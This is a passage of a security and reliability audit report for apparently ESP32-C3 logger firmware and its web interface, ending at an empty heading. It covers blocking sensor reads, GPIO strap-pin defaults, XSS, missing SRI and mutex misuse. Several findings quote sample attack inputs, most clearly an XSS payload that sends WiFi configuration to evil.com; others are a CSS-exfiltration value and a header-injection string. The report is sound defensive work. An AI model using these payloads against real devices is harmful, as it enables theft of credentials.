Files: `sensors/plugins/HCSR04Sensor.*`, `SoilMoistureSensor.*`, `ZMPT101BSensor.*`, `ZMCT103CSensor.*`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 24.1 | H | HCSR04Sensor.h — Plugin does NOT override `isBlocking()` → inherits `false` from ISensor.h:77 → dispatched on **SensorTask** (fast path). `pulseIn(_echoPin, HIGH, 30000)` at .cpp:35 blocks up to 30 ms per read; starves all I2C sensors sharing the same tick. | Override `bool isBlocking() const override { return true; }`. | Fixed (#93) |
| 24.2 | M | HCSR04Sensor.cpp:35 — `pulseIn` runs without `noInterrupts()` / `portDISABLE_INTERRUPTS()`. FreeRTOS scheduler tick (~1 ms) preempting the 30 ms wait corrupts the measurement → ~17 cm error per preemption. Same class as 17.11. | Wrap in interrupt-disabled context; brief WiFi/AsyncTCP stall is acceptable for 30 ms. | Pending |
| 24.3 | L | HCSR04Sensor.cpp:40 — Speed of sound hardcoded 0.034 cm/µs (~20 °C). 2-3 % error over 0-40 °C. | Optional: read BME280 temperature; `c = 331.3 + 0.606*T` m/s. | Pending |
| 24.4 | M | HC-SR04 hardware mismatch — module datasheet 5 V; ESP32-C3 GPIO 3.3 V. Many C3 boards tolerate 5 V on input but out-of-spec. | Document required level-shifter on echo pin. | Pending |
| 24.5 | M | SoilMoistureSensor.cpp:24 — `pinMode(_pin, INPUT)` with NO `analogSetPinAttenuation()`. ESP32-C3 default attenuation caps ADC at ~1.5 V; capacitive soil output up to 3.0 V → top half of range wasted, "dry air" reads clipped at saturation. | Add `analogSetPinAttenuation(_pin, ADC_11db);` before `pinMode`. | Pending |
| 24.6 | H | ZMPT101BSensor + ZMCT103CSensor — NEITHER overrides `isBlocking()`. Defaults `_samples=200 × _samplePeriodUs=100` = 20 ms block on SensorTask per read; with both enabled + I2C in same tick, ProcessingTask throughput collapses. | Override `isBlocking()=true` in both headers. | Fixed (#93) |
| 24.7 | M | ZMPT101BSensor.cpp:46 + ZMCT103CSensor.cpp:46 — `alloca(sizeof(int) * 500)` = 2000 B worst-case stack alloc per call. STACK_SENSOR_TASK=4096 minus caller's frame leaves little headroom. | Pre-allocate `int _buf[500]` as member, or cap _samples at 250. | Pending |
| 24.8 | M | ZMPT/ZMCT/Soil default `_pin = 0 / 1 / 0`. **GPIO0 is an ESP32-C3 strap pin** (boot mode select). Analog signal present at power-on can alter boot mode. Same risk class as 23.3 (RainSensor GPIO9). | Change defaults to non-strap ADC pins (GPIO3 / GPIO4). | Pending |
| 24.9 | L | ZMPT/ZMCT default `factor=1.0` — produces raw ADC RMS count as "Vrms"/"Arms". AlertEngine rules `voltage_vrms > 230` never fire until calibrated. | Surface "uncalibrated" warning in /api/sensors when factor==1.0 AND value>0. | Pending |
| 24.10 | L | ZMPT/ZMCT — 20 ms window = exactly 1 cycle at 50 Hz; at 60 Hz = 1.2 cycles → partial-cycle bias ≈ 1 % stddev error. | Auto-detect frequency via zero-crossings, or document 50 Hz target. | Pending |
| 24.11 | I | ZMPT/ZMCT use `ADC_11db` constant; deprecated in ESP-IDF 5.x in favour of `ADC_ATTEN_DB_12`. Compiles with warning. | Switch to `ADC_ATTEN_DB_12`. | Pending |
| 24.12 | I | All Phase 24 plugin headers — trivial declarations + static metric arrays. | [MODULE SAFE for headers beyond items above] | N/A |

---

## Phase 25 — Frontend Bootstrap (theme-boot, icons, core.js core)

Files: `www/js/theme-boot.js`, `www/js/icons.js`, `www/js/core.js` (bootstrap section L1-170)

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 25.1 | I | theme-boot.js:39-51 — Whitelist-validates `accent`/`density`/`theme` values from localStorage; rejects unknown values silently. Defends against localStorage poisoning via XSS or browser extensions. Best practice. | [MODULE SAFE — model of correct defensive coding for the UI] | N/A |
| 25.2 | M | icons.js:163-173 + L186 — `svg(name)` interpolates `name` into `data-lucide="' + name + '"` string template, then L186 inserts via `el.innerHTML`. The L181 whitelist (`if (!ICON_PATHS[name]) continue`) prevents arbitrary names from reaching the template TODAY. Any future change that bypasses the whitelist (e.g. lazy-fetched icons, raw passthrough) would expose stored XSS via the `name` interpolation. | Replace string concat with `setAttribute('data-lucide', name)` on a DOM-constructed `<svg>`; document the whitelist invariant in a comment. | Fixed (#82) |
| 25.3 | L | icons.js:175-188 `swap` queries `[data-icon]` and overwrites innerHTML on every page navigation. Reflow cost on large pages. | Cache rendered icons in a Map keyed by name; the L183-185 "already swapped" check handles repeats but not first-paint cost. | Pending |
| 25.4 | I | core.js:67 `var Handlers = Object.create(null);` — null-prototype map. Defends against prototype-pollution where an attacker controlling JSON could inject `__proto__` keys. Best practice. | [MODULE SAFE] | N/A |
| 25.5 | M | core.js:80-87 `JSON.parse(raw)` of `data-args` attribute — try/catch wrapped but NO LENGTH CAP. Markup-injected `data-args="...1MB JSON..."` heap-pressures the browser parser. Server-side values are bounded today; future injected dynamic markup could exceed. | Reject when `raw.length > 4096` before parse. | Pending |
| 25.6 | L | core.js:74 — `t = ev.target.closest("[data-" + eventName + "]")` finds NEAREST ancestor; outer ancestors with same handler are silently shadowed. May be intentional but undocumented. | Add comment clarifying single-fire bubble policy. | Pending |
| 25.7 | L | core.js:100-103 — Document-level submit listener with capture=true runs `_dispatchEvent("submit")(ev)` for EVERY submit even when no `[data-submit]` ancestor exists. Wasted closure call. | Inline the closest check before invoking dispatcher. | Pending |
| 25.8 | M | core.js:156-157 `showPopup(id) / hidePopup(id)` — Sets `style.display` by id with NO id-whitelist. Caller-supplied id is trusted. Today only registered Handlers can call these (25.4 whitelist mitigates), but defense-in-depth gap. | Add `LEGAL_POPUP_IDS = ['restartPopup','popup','movePopup',...]` whitelist inside showPopup. | Pending |
| 25.9 | L | core.js:29-42 — Module globals (`liveTimer`, `liveES`, `currentPage`, `filesEditMode`, `CFG`, `ST`, ...) declared at file scope, polluting `window`. Multiple JS files share globals per architecture comment L4-14; accidental name collisions silently overwrite. | Wrap each file's state in an IIFE with a single `window.WL_*` export object. | Pending |
| 25.10 | I | theme-boot.js — Loaded synchronously in `<head>` to prevent FOUC. Adds ~5-10 ms to first paint. Acceptable, documented. | [Acceptable] | N/A |
| 25.11 | I | core.js, icons.js — Both use strict mode (`"use strict";`). theme-boot.js uses safe constructs only. Consistent enough. | [Acceptable] | N/A |

---

## Phase 26 — Frontend Pages & Sensor Views

Files: `www/js/pages.js`, `www/js/sensors.js`, `www/js/iot-extensions.js`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 26.1 | H | pages.js:217-235 `dbBuildCardHtml` — Builds `<div class="sensor-card-mini" data-key="' + key + '">...<span title="' + p.id + '">' + (p.name \|\| p.id) + '</span>... <span class="sensor-card-mini-metric">' + p.metric + '</span>...'` then L196 `grid.innerHTML = pairs.map(dbBuildCardHtml).join("")`. **`p.id`, `p.name`, `p.metric` are NEVER passed through `esc()`**. Sensor IDs come from platform_config.json (user-controllable, no validation per 13.7 family). Malicious id `x"><script>fetch('/api/modules/wifi').then(r=>r.text()).then(t=>fetch('//evil.com/?'+btoa(t)))</script>` runs on every dashboard load with full /api/* access. **STORED XSS**. | Wrap every interpolation in `esc()`: ``'<div data-key="' + esc(key) + '">...<span title="' + esc(p.id) + '">' + esc(p.name \|\| p.id) + '</span>...'``. | Fixed (#82) |
| 26.2 | H | pages.js:32-89 `dbLoadUPlot` — Loads uPlot from `https://cdn.jsdelivr.net/npm/uplot@1/dist/uPlot.iife.min.js` via `<script src>` with NO Subresource Integrity (SRI) hash. CDN compromise / DNS hijack delivers arbitrary JS executing in the SPA's authenticated context (full /api/* access, can rotate WiFi creds, flash OTA, etc.). | Add `integrity="sha384-..."` and `crossorigin="anonymous"` attributes to the dynamic script element. Pin version (not `uplot@1`). | Fixed (R18 PR pending) |
| 26.3 | H | pages.js:74, L31 — `localSrc = th.chartLocalPath \|\| "/uPlot.iife.min.js"`. `chartLocalPath` is ThemeConfig user input (saved via /save_theme and /api/modules/theme). Then `s.src = localSrc` injects it into a `<script src=>`. Setting chartLocalPath=`"//evil.com/x.js"` (protocol-relative URL bypasses `javascript:` URL-scheme blocking) loads attacker JS at every dashboard mount. Validation gap from 13.7 has direct script-execution impact. | Validate chartLocalPath server-side: reject anything not matching `^/[a-zA-Z0-9._-]+\.js$`. Client-side, also strip protocol-relative `//`. | Fixed (#93) |
| 26.4 | M | pages.js:1057-1059 `modeEl.innerHTML = "🌐 Online Logger";` — static strings only. OK in isolation. But mode comes from `d.mode` (L1057 `if (d.mode === "online")`) — a server-controlled string used in conditional logic. If backend ever sends a non-canonical value, no fallback shows raw mode value as plain text (acceptable for diagnostics). | Cosmetic only. | Pending |
| 26.5 | M | sensors.js:42-58 `pcfgSave` — POSTs to `/save_platform` with `Content-Type: application/octet-stream` but a JSON body. Backend accepts via raw body buffer, but the wrong content-type may cause future middleware / proxies to reject. | Use `Content-Type: application/json`. | Pending |
| 26.6 | L | sensors.js:11 `PCFG = null` — module-global cache mutated by multiple init paths. Concurrent fetches (e.g. user clicks "Reload" while load in flight) race; latter response overwrites the first. | Hold an in-flight promise and dedup like core.js `_csrfFetch`. | Pending |
| 26.7 | I | sensors.js — Consistently uses `esc()` on every user-controllable interpolation (L200, L222-242, L862, L904, L1144). **Good hygiene; contrast with pages.js (26.1).** | [MODULE SAFE for the audited render paths] | N/A |
| 26.8 | I | iot-extensions.js — Uses `esc()` on user-controllable interpolations in the audited render paths (L441, L443, alert renders). Page-template `innerHTML` blobs (L155, L469, L670) are static HTML constants. | [MODULE SAFE for the audited render paths] | N/A |
| 26.9 | M | pages.js / sensors.js / iot-extensions.js — Heavy reliance on `innerHTML` for dynamic grid/list rendering. Every page navigation builds large HTML strings and reflows. Performance OK at current data volumes but degrades with N sensors > 16 or many alert rules. | Long-term: switch to template literals + `<template>` cloning, or a tiny VDOM library. | Pending |

---

## Phase 27 — Frontend Settings & Shell

Files: `www/js/settings.js`, `www/index.html`, `www/style.css`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 27.1 | H | settings.js:34-55 `sdInit` — Builds System Info card via concatenated `innerHTML` interpolating `d.version`, `d.boot`, `d.mode`, `d.cpu`, `d.chip` from `/api/status` **WITHOUT `esc()`** on any of them. Today the fields are server-controlled (firmware version, chip model from `ESP.getChipModel()`, etc.) but the trust-the-server pattern is fragile: ESP.getChipModel returns whatever the SDK chooses, and a future bug or backdoor could place attacker content there. Same pattern as 26.1; lower exploit likelihood but identical class. | Wrap every interpolation in `esc()`. | Fixed (#82) |
| 27.2 | M | settings.js — Many other innerHTML sites (network/datalog/theme renders) similarly interpolate without consistent escaping. Each must be audited individually; spot checks show mixed hygiene compared to sensors.js. | Run a project-wide grep for `innerHTML.*\+` patterns and wrap user-data in `esc()`. | Fixed (#82) |
| 27.3 | M | index.html:17, 766-774 — 6 sequential `<script src=>` tags loaded synchronously (no defer/async). Total bundle is ~6K lines of JS (theme-boot + core + icons + pages + settings + sensors + iot-extensions). First-paint blocked by full parse. Documented constraint (L763 comment: "load order matters, shared globals") — but defer with strict load-order is supported by all modern browsers. | Add `defer` to all `<script src>` tags from `/js/core.js` onwards (theme-boot stays sync). Re-test load order with `defer`. | Pending |
| 27.4 | M | index.html:80, L92-100 (and others) — `data-args='["restartPopup"]'` style attributes drive `showPopup(id)` (25.10 — no id whitelist). Markup-injected `data-args='["someOtherPopup"]'` could trigger arbitrary popup if attacker can inject DOM. Tied to 25.10 fix. | Apply 25.10 whitelist. | Pending |
| 27.5 | L | index.html:13 `<style id="themeVars"></style>` — Empty `<style>` placeholder for runtime CSS-variable injection. If applyStatus ever writes UNescaped user values (e.g. `--primary-color: ${config.theme.primaryColor}` with malicious value `red; } body { background: url(//evil.com/log?...) } #x {`), CSS-injection enables data exfiltration via `background-image: url(...)` requests. Tied to 13.7 (ThemeModule accepts unvalidated colors). | Server-side: validate every color field with `^#[0-9a-fA-F]{6}$`. Client-side: when writing themeVars, escape `;` `{` `}` `*/`. | Pending |
| 27.6 | I | index.html — Grep confirms ZERO inline event handlers (`onclick=`, `onload=`, `onerror=`, etc.) across index.html AND all /www/pages/*.html. **Excellent CSP posture** — `script-src` can drop 'unsafe-inline' for non-failsafe builds (WebServer.cpp:374 still has it for the FAILSAFE_HTML which has inline scripts). | Audit WebServer.cpp:371-381 CSP — once FAILSAFE_HTML is updated to also use external scripts, drop `'unsafe-inline'` from script-src. | Pending |
| 27.7 | I | style.css:9-19 `@font-face` with `src: url("/fonts/...woff2")` — local fonts only, no Google Fonts CDN. CSP `font-src 'self'` covers it. Good offline-first design. | [MODULE SAFE] | N/A |
| 27.8 | L | style.css:375 `background-image: url("data:image/svg+xml;utf8,<svg...");` — inline data: URI in CSS. Backend CSP has `img-src 'self' data:` so it's allowed. Safe in this static instance but represents general data: URI permissiveness in the policy. | Acceptable trade-off. | N/A |
| 27.9 | M | settings.js — Every settings page makes 1-3 sequential fetches without timeout (4.8 family). Slow backend (e.g. wedged fsMutex per 8.x family) leaves settings pages "Loading…" forever. | Apply 4.8 fix across all fetches. | Pending |
| 27.10 | I | index.html — Uses `data-click="..."`, `data-args='[...]'` consistently for event wiring through core.js Handlers map (25.4). No inline JS, no eval, no `Function()`. **Excellent CSP/XSS posture for the SPA shell**. | [MODULE SAFE for the shell structure] | N/A |
| 27.11 | L | index.html:69-73 `data-click="quickThemeToggle"` and other handlers reference Handlers map entries. If `quickThemeToggle` is not registered (e.g. due to a bundling order bug), the dispatcher silently no-ops — user clicks have no effect with no error message. | Log a console warning when Handlers[name] is missing in `_dispatchEvent`. | Pending |
| 27.12 | M | settings.js:36-54 interpolates `d.version`, etc., into the System Info card. If a future `/api/status` payload field becomes user-controllable (e.g. via deviceName flowing into mode display), no escape boundary. Defensive programming missing. | Same as 27.1/27.2. | Fixed (#82) |

---

## Phase 28 — Settings HTML (Device / Hardware / Network / Time)

Files: `www/pages/settings_device.html`, `settings_hardware.html`, `settings_network.html`, `settings_time.html`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 28.1 | M | settings_network.html:44, L81 — `<input type="password">` for apPassword/clientPassword populated from `/export_settings` returning cleartext credentials (3.7 family). DevTools "Inspect Element" reveals `input.value`; browser autofill also exposes them. | Mask via JS placeholder `"***"`; require explicit "Show" toggle that fetches via `?include_secrets=1`. Also fix 3.7 server-side. | Pending |
| 28.2 | M | settings_network.html:72-78 — `<div id="wifiList">` populated by `netScanWifi`. SSIDs are user-controlled (any visible AP); malicious SSID `<img src=x onerror=...>` would inject via innerHTML if settings.js renders without `esc()`. Verify the render path. | Audit settings.js `netScanWifi`; ensure SSID rendering uses `esc()` or textContent. | Fixed (#82) |
| 28.3 | M | settings_time.html:93 — `<form action="/backup_bootcount" method="POST">` is a **NATIVE POST form** that bypasses the SPA's `data-submit` dispatcher and CSRF-token injection (core.js:865). Backend lacks CSRF on this endpoint (3.4 family) so it works today; if backend CSRF were added per 3.4, this form would 403. Inconsistent attack surface. | Convert to `<form data-submit="timeBackupBoot">`; add `timeBackupBoot` Handler in settings.js. | Pending |
| 28.4 | L | settings_hardware.html:13 — `<img src="" data-error="hideParent">` populated by hwInit from `config.theme.boardDiagramPath`. Browser blocks `javascript:` for img src; CSP `img-src 'self' data:` blocks external URLs. Safe in practice. | [Acceptable] | N/A |
| 28.5 | I | settings_device.html:70-89 `<div id="sysInfo">` populated via innerHTML in sdInit; escape fix lives at JS layer per 27.1. | See 27.1. | Pending |
| 28.6 | I | All four Phase-28 HTML files use `data-click`/`data-submit` dispatcher (except 28.3). No inline event handlers. Good CSP posture. | [MODULE SAFE] | N/A |
| 28.7 | L | settings_device.html:17, 25 — `maxlength="32"` / `"12"` match Config.h:230-231 buffer sizes. Frontend caps align with backend strncpy. Good. | [Acceptable] | N/A |
| 28.8 | L | settings_network.html:94-97 — Hidden inputs cache "current" connection details, NOT submitted (no `name`). UI state only. | [Acceptable] | N/A |
| 28.9 | I | settings_time.html:80 — `data-change="submitParentForm"` on RTC-protect checkbox triggers auto-submit on toggle. Acceptable UX. | [Acceptable] | N/A |

---

## Phase 29 — Settings HTML (Datalog / Flowmeter / Theme / Core Logic)

Files: `www/pages/settings_datalog.html`, `settings_flowmeter.html`, `settings_theme.html`, `settings_corelogic.html`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 29.1 | M | settings_theme.html:40-43 — Form fields `name="bgColor"` and `name="textColor"`. Backend WebServer.cpp:1149-1152 reads `lightBgColor`/`darkBgColor`/`lightTextColor`/`darkTextColor` (per Config.h:117-120). **The form values are silently dropped** on save. UI reads back the correct fields via `/export_settings` so the page appears to save, but bg/text changes never persist. Functional bug. | Rename inputs to match: split into `lightBgColor`+`darkBgColor` and `lightTextColor`+`darkTextColor`. | Pending |
| 29.2 | L | settings_corelogic.html — All controls live OUTSIDE any `<form>`. Save triggered via `data-click="clSave"` (custom handler). Verify clSave includes CSRF token append; otherwise mutating save 403s once CSRF is enforced. | Audit clSave in settings.js / sensors.js; add CSRF token if missing. | Pending |
| 29.3 | M | settings_corelogic.html:157-160 — Export quick-enable checkboxes (MQTT/HTTP/SC/OSM). Hint says "Full configuration in Export settings". The checkboxes need to write `config.export.<name>.enabled` — verify clSave maps them correctly; otherwise state never persists. | Audit clSave's export-section handling. | Pending |
| 29.4 | L | settings_theme.html:75-79 — Text inputs for `logoSource[129]`, `faviconPath[33]`, `boardDiagramPath[65]` have NO `maxlength`. User can paste > buffer size; backend strncpy truncates silently. UI shows full string while persisted value is truncated → confusing UX. | Add `maxlength="128"` / `"32"` / `"64"` matching Config.h buffer sizes. | Pending |
| 29.5 | L | settings_theme.html:75, 78 — `logoSource`/`faviconPath`/`boardDiagramPath` accept ANY string. Backend lacks path validation (13.7). CSP `img-src 'self' data:` blocks external loads at runtime, but a malicious URL like `https://evil.com/track.png` is persisted. | Add `pattern="^/[\\w./-]+$"`; server-side validate per 13.7. | Pending |
| 29.6 | M | settings_theme.html:99 `<input name="chartLocalPath">` — text input with NO pattern. Combined with pages.js:74 loading this verbatim into `<script src>` (26.3), this is the user-facing injection point for the chart-CDN XSS vector. | Add `pattern="^/[a-zA-Z0-9._-]+\\.js(\\.gz)?$"` client-side; server-side reject protocol-relative `//host/x.js` per 26.3. | Pending |
| 29.7 | I | settings_datalog.html — Numeric `min`/`max` attributes align with backend `constrain()` calls in WebServer.cpp:1177-1189. Good. | [Acceptable] | N/A |
| 29.8 | I | settings_datalog.html:16 `<select name="currentFile">` — populated by dlInit (settings.js:1068-1073) using `opt.textContent = f.path` + `opt.value = f.path` (not innerHTML). DOM-native escaping makes filename injection safe. **Good pattern**. | [MODULE SAFE — model of safe option rendering] | N/A |
| 29.9 | L | settings_flowmeter.html:24, 29 — `<input type="number" name="pulsesPerLiter">` and `name="calibrationMultiplier"` have NO `min` attribute. User can submit 0 or negative; backend applyDefaults catches `< 1.0f` (ConfigManager.cpp:25) but only on next config load. No immediate UI feedback. | Add `min="1" step="0.1"` (pulsesPerLiter), `min="0.01"` (multiplier). | Pending |
| 29.10 | I | settings_theme.html — Uses native `<input type="color">` (L37-63) which browsers restrict to `#RRGGBB` hex. **Partial frontend mitigation** for 13.7's color-validation gap. Direct API POST still bypasses. | [Acceptable frontend mitigation] | N/A |

---

## Phase 30 — Settings HTML (Export / Modules / OTA)

Files: `www/pages/settings_export.html`, `settings_modules.html`, `update.html`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 30.1 | M | settings_export.html — Most text inputs lack `maxlength` matching backend buffer sizes: L35 `topic_prefix` (backend `_topicPrefix[33]`), L39 `client_id` (`_clientId[33]`), L45 `username` (`_username[33]`), L49 `password` (`_password[65]`), L78 `http url` (`_url[129]`), L131 `osm token` (`_token[65]`). Backend strncpy truncates silently; UI mismatch. Same family as 29.4. | Add `maxlength` matching exporter `.h` buffer sizes. | Pending |
| 30.2 | H | settings_export.html:82 — `<input id="exp-http-auth">` for HTTP Authorization header. Free-form text. Combined with HttpExporter.cpp:14-21 copying header values verbatim (18.8), `Token X\r\nHost: evil.com` injects extra headers → request smuggling. | Strip `\r\n\0` client AND server side per 18.8. | Fixed (#91) |
| 30.3 | H | settings_export.html:78 — `<input id="exp-http-url">` HTTPS URL, NO pattern. User pastes any URL; HttpExporter (18.9) loads without cert verification. Direct exploit surface for MITM. | Validate against `^https?://...$` pattern; require explicit "insecure HTTP OK" checkbox for `http://`. | Fixed (#91) |
| 30.4 | H | settings_export.html:131 — OSM access token as `<input type="password">`. Populated by expLoad from /export_settings cleartext (19.14). DevTools "Inspect Element" reveals `input.value`. Same as 28.1. | Mask via JS placeholder; fetch via `?include_secrets=1`. | Fixed (#91) |
| 30.5 | M | settings_export.html:142 — `<button data-click="expSave">` outside any `<form>`. Same family as 29.2 — bypasses form-submit CSRF flow. | Audit expSave; ensure CSRF token append. | Pending |
| 30.6 | L | settings_export.html:29 — `<input type="number" id="exp-mqtt-port" value="1883">` no `min`/`max`. User can submit 0/-1/65536+. Backend reads via `| 1883` cast to uint16 — values >65535 wrap. | Add `min="1" max="65535"`. | Pending |
| 30.7 | L | settings_export.html:55, L87, L108 — Interval inputs lack `min`. User can set 0 → flood mode. Backend no validation. | Add `min="1000"`. | Pending |
| 30.8 | I | settings_modules.html — Tab strip populated from /api/modules; per-module form renders from server-supplied schema. Uses `data-click="modulesSelect"`. **Single mutating-save point via Modules.save (settings.js:1665).** Good pattern. | [MODULE SAFE for the modules-page shell] | N/A |
| 30.9 | I | update.html:50 `<form data-submit="otaUpload">` — dispatcher used. CSRF gap is in settings.js otaUpload (4.5), not HTML. | See 4.5. | N/A |
| 30.10 | I | update.html:61 `accept=".bin" required` — frontend hint only; backend magic-byte check (3.3) + client SHA-256 (4.13) are the real guards. | [Acceptable] | N/A |

---

## Phase 31 — Static Configuration & Changelog

Files: `www/platform_config.json`, `www/changelog.txt`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 31.1 | C | platform_config.json:226-228 — `"rain"` sensor `"pin": 9`. **GPIO9 is ESP32-C3 boot-strap pin** — reed switch closed at power-on selects SPI download mode (soft-brick). **23.3 INSTANTIATED in shipped default config**. User enabling rain on first boot has a 50/50 brick chance depending on bucket position. | Change default to a non-strap GPIO (e.g. 4 or 10). | Fixed (#77) |
| 31.2 | H | platform_config.json — Multiple sensors default to ESP32-C3 strap pins: L242 `wind` pin=8 (strap), L273 `ds18b20` pin=2 (strap), L213 `soil_1` pin=3 (strap), L286 `zmpt101b` pin=0 (strap). User enabling any inherits 23.3 / 24.8 boot-mode interference. | Change defaults to non-strap GPIOs per ESP32-C3 datasheet (4/5/6/7/10). | Fixed (#87) |
| 31.3 | H | platform_config.json:301 — `"zmct103c"` `"pin": 1`. **GPIO1 is UART0 TX** on ESP32-C3 (and USB CDC in CDC-on-Boot mode swaps it). Conflicts with Serial console and programming. | Change default to GPIO3 (ADC1_CH3) or another non-UART ADC pin. | Fixed (#87) |
| 31.4 | M | platform_config.json:12, L26 — `flow_main` and `flow_large` both default `"pin": 21`. **GPIO21 is USB D+ on ESP32-C3 SuperMini** (5.7). Default flow sensor pin breaks USB CDC; flow_large/flow_main also collide with each other but harmless since enabled=false. | Change default; document SuperMini variant in INSTRUCTIONS.md. | Pending |
| 31.5 | M | platform_config.json:91-93, L105-107 — `sds011` AND `pms5003` both default `"uart_rx": 20`. ESP32-C3 has one UART besides USB-CDC; 21.1 instantiated. | Default one of them to `-1` (disabled UART) so user must explicitly pick. | Pending |
| 31.6 | M | platform_config.json:39-44, L54-60, L70-75 — `bme280`, `bmp280`, `bme688` ALL default `sda=6, scl=7, address=0x76`. Identical I2C address — only ONE can init. Plus pins conflict with DS1302 RTC defaults (5.9 family). | Stagger addresses (bme280=0x76, bmp280/bme688=0x77); move I2C pins to non-RTC GPIOs (e.g. 8/9 for SuperMini). | Pending |
| 31.7 | M | platform_config.json:164-167, L178-183 — `veml6075` and `veml7700` both default `sda=6, scl=7`. Both drivers have **fixed I2C address 0x10** (22.4) → cannot coexist. JSON has no way to express the exclusion. | Add documentation `_comment`; or pick exclusion-aware defaults. | Pending |
| 31.8 | L | platform_config.json:382-399 — `"_comment"` keys in `sleep.*` sections. ArduinoJson parses them as data (no `#` comment syntax in JSON). Inflates parsed-doc memory by ~250 B per parse. Backend ignores the keys. | Move comments to a sidecar markdown doc. | Pending |
| 31.9 | L | platform_config.json:362-369 — `webhook.rules` demo entry uses `"sensor_id": "temp_indoor"` which does NOT match any default-enabled sensor. With webhook enabled, the rule never fires. Misleading default. | Either empty the rules array, OR change sensor_id to match a real default sensor. | Pending |
| 31.10 | I | platform_config.json — All sensors default `enabled: false` except flow_main. Conservative defaults minimise out-of-box conflicts. | [MODULE SAFE — conservative defaults] | N/A |
| 31.11 | L | changelog.txt:1 — Title `"## v4.2.0"` matches Config.h VERSION but conflicts with `"v5.1.0"` banner in ESP_Logger.ino:2 / project comments (5.6). Version drift. | Pick one canonical version; align Config.h + ESP_Logger.ino banner + changelog + docs. | Pending |
| 31.12 | I | changelog.txt — Plain text rendered via /api/changelog; settings.js parses `##` headers as Markdown. No XSS risk (static text). | [MODULE SAFE] | N/A |

---

## Audit Coverage Summary

All 31 phases complete. Total findings: **~340** across all severity levels.

| Severity | Count (approx) | Notes |
|---|---|---|
| **C** (Critical) | ~6 | Default-config GPIO9 rain pin (31.1), config.bin download leak (3.6), factory_reset assert (3.13), startAll never called (6.11), pages.js stored XSS (26.1), webhook overlap (multiple) |
| **H** (High) | ~50 | OTA without CSRF, plaintext credential exposure, CDN script with no SRI, fsMutex bypass family, UAF on sensor reload, MQTT/HTTP no TLS, ZMPT/HC-SR04/SCD4x blocking SensorTask, etc. |
| **M** (Medium) | ~140 | Validation gaps, race conditions, missing maxlength, missing isBlocking() overrides, partial-batch duplicates, theme bgColor name mismatch, etc. |
| **L** (Low) / **I** (Info) | ~150 | Cosmetic / defense-in-depth / documented design choices / [MODULE SAFE] notes |

**Highest-impact remediation priorities:**
1. Change RainSensor default pin (31.1) — single config edit prevents soft-brick.
2. Protect `/config.bin` and `/alerts.json` from /download (3.6, 7.1).
3. Mask plaintext credentials in /export_settings (3.7, 19.14, 28.1, 30.4).
4. Add CSRF/rate-limit to /factory_reset, /restart, /do_update, /backup_bootcount (3.1-3.4).
5. Fix WaterFlow/Rain/Wind ISR cleanup (2.6, 23.2-23.3) — UAF on reloadConfig.
6. Fix VEML6075/VEML7700 I2C address conflict (22.4) and centralise Wire.begin (20.1).
7. Override isBlocking()=true on HCSR04/ZMPT/ZMCT (24.1, 24.6) — SensorTask starvation.
8. Add SRI hash + path validation on uPlot CDN load (26.2, 26.3, 29.6).
9. Fix theme bgColor/textColor field-name mismatch (29.1) — silent save failure.
10. Implement `moduleRegistry.startAll()` (6.11) — modules don't get their start() called.

[END OF AUDIT — Phase 31]

---

## FINAL PHASE — System Architecture Risks (Cross-Boundary / Systemic)

Scope: zoomed-out audit of the "glue" between subsystems. Findings are systemic — they do NOT show up in any single-file review but emerge when tracing a transaction across modules.

### A — Mutex Topology & Deadlock Analysis

**Mutex inventory (acquirer → holder time)**
- `fsMutex`: protected by ~6 acquirers (StorageTask portMAX_DELAY, web /upload 5000ms, /delete 500ms, /mkdir 500ms, /move 500ms, factory_reset 2000ms-bypassed, saveConfig 3000ms-bypassed); **violated by ~12 writers** that never acquire it (RtcManager.backupBootCount 8.8, DataLogger.flushLogBufferToFS 9.9, OtaManager._logOtaEvent 9.12, FlowRunLogger._closeRun 12.10, AlertEngine._save 15.9, ExportManager._spoolBatch 18.3 / _drainSpool 18.6, moduleRegistry.saveAll 1.9 / 6.15, plus _writeResetLog and various ad-hoc opens).
- `configMutex`: 2 acquirers (handleConfigPlatform 2000ms, handleApiBackup 500ms). SensorTask reads `_sensors[]` WITHOUT it (3.19).
- `webDataMutex`: ProcessingTask try-take-0 (2.8), ApiHandlers 50ms, SensorManager.toJson 50ms.
- `wireMutex`: SensorManager.tickFiltered 100ms with SILENT fallthrough on timeout (15.4).
- Class-local `_mutex`: AlertEngine try-take-0 in hot path (15.7) / portMAX_DELAY in _dispatch (15.8); LiveAggregator portMAX_DELAY; FlowRunLogger portMAX_DELAY.

**FA.1 (H) — fsMutex is theatrical, not protective.** ~12 mutex-bypass writers + saveConfig "proceed even on timeout" + factory_reset "give without take" means the LittleFS allocator regularly sees concurrent calls from multiple tasks. Classic deadlock is avoided ONLY because the lock is mostly absent. Replacing the bypass sites with proper acquire could expose latent lock-order bugs. Fix sequencing: first add bypass-site acquires with timeouts, then run for weeks under load, then tighten portMAX_DELAY holders.

**FA.2 (H) — Priority inversion at TASK_PRIO_EXPORT=TASK_PRIO_STORAGE=1.** Both tasks run at priority 1. ExportTask's TLS sendAll blocks for up to 35s per exporter × 5 exporters = 175s (11.8). During that window, StorageTask is NOT preempted (same priority, cooperative yield only) but its own portMAX_DELAY on fsMutex + drain-loop heartbeat starvation (11.6) compounds. ProcessingTask at priority 2 preempts both, fills `storageQueue` past depth 32, drops silently (2.9). The cascade hits the C4 watchdog within 30s regardless of which task wedges.

**FA.3 (M) — Implicit lock-order: configMutex → fsMutex → wireMutex → webDataMutex → class-local _mutex.** No code enforces this order; reviewers must trace each new locking site by hand. The most fragile junction: AlertEngine._dispatch (15.8) holds `_mutex` while calling MqttExporter.send → potential to enter MQTT_Mini network paths that today don't lock but easily could in a future revision, creating a deadlock against handleApiAlertsSave (which holds `_mutex` 1000ms and would call back into AlertEngine via shared globals if any cycle is introduced).

**FA.4 (M) — webDataMutex try-take-0 in producer (ProcessingTask 2.8) means readers (ApiHandlers / SensorManager.toJson) effectively race the writer.** No deadlock — but no isolation either; ring buffer torn reads (12.12-12.13) are the visible symptom. Calling this "lock-protected" misleads new contributors.

### B — ISR ↔ Task ↔ Flash Cross-Context Races

